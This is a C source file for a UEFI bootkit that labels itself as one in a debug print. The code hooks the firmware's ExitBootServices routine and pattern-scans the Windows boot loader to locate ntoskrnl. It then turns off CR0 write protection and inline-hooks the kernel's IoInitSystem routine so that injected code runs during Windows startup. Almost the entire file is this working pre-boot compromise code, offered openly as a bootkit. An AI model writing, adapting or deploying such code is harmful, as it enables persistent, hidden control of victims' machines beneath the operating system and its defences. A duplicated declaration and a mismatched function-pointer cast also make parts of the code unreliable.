//
// Basic UEFI Libraries
//
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>

//
// Boot and Runtime Services
//
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

//
// Shell Library
//
#include <Library/ShellLib.h>
#include "util.h"

#include <intrin.h>
#include "ntdef.h"
#include "hook.h"

VOID* g_kernel_base;

EFI_EXIT_BOOT_SERVICES o_ExitBootServices;

// We obtain this with an exitbootservices hook and then use it in NotifySetVirtualAddressMap
VOID* AddressInWinload;

// This doesn't actually point to the top of IoInitSystem, it points to after IoInitSystemPreDrivers, which is number of bytes in.
UINT32(*IoInitSystem)();

VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    // AddressInWinload is in OslFwpSetupKernelPhase1, looking for OslpLogOsLaunch
    UINT64 scan_result = PatternScan("48 B8 77 BE 9F 1A 2F DD 24 06 49 F7 E1", AddressInWinload, 0x10000, FALSE);

    PLOADER_PARAMETER_BLOCK ldr_block = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(scan_result + 0x10) + scan_result + 0x14);

    g_kernel_base = GetModuleFromList(&ldr_block->LoadOrderListHead, L"ntoskrnl.exe")->DllBase;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ull);
    // Hooks here
    // First we inline hook IoInitSystem
    IoInitSystem = (UINT32(*)(UINT64, UINT64, UINT64, UINT64))
        ((BYTE*)PatternScan("48 83 EC 28 48 8D 05 ?? ?? ?? ?? 48 89 44 24 38 E8 ?? ?? ?? ?? 84 C0 0F 84",
        g_kernel_base, 0x1000000, FALSE) + 0x29);
    Hook_IoInitSystem((UINT8*)IoInitSystem, (VOID*)IoInitSystemHook);

    AsmWriteCr0(cr0);
    return;
}

EFI_EXIT_BOOT_SERVICES o_ExitBootServices;

EFI_STATUS
EFIAPI hk_ExitBootServices(
    IN  EFI_HANDLE                   ImageHandle,
    IN  UINTN                        MapKey
)
{
    Print(L"Hi from bootkit\n");
    gBS->ExitBootServices = o_ExitBootServices;
    AddressInWinload = _ReturnAddress();
    return gBS->ExitBootServices(ImageHandle, MapKey);
}

EFI_STATUS
EFIAPI
UefiMain (
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE* SystemTable
    )
{
    o_ExitBootServices = gBS->ExitBootServices;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ull);
    gBS->ExitBootServices = hk_ExitBootServices;
    AsmWriteCr0(cr0);

    EFI_EVENT event; // We will never ever access this through the handle so its ok that it goes out of scope.
    return gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);
}

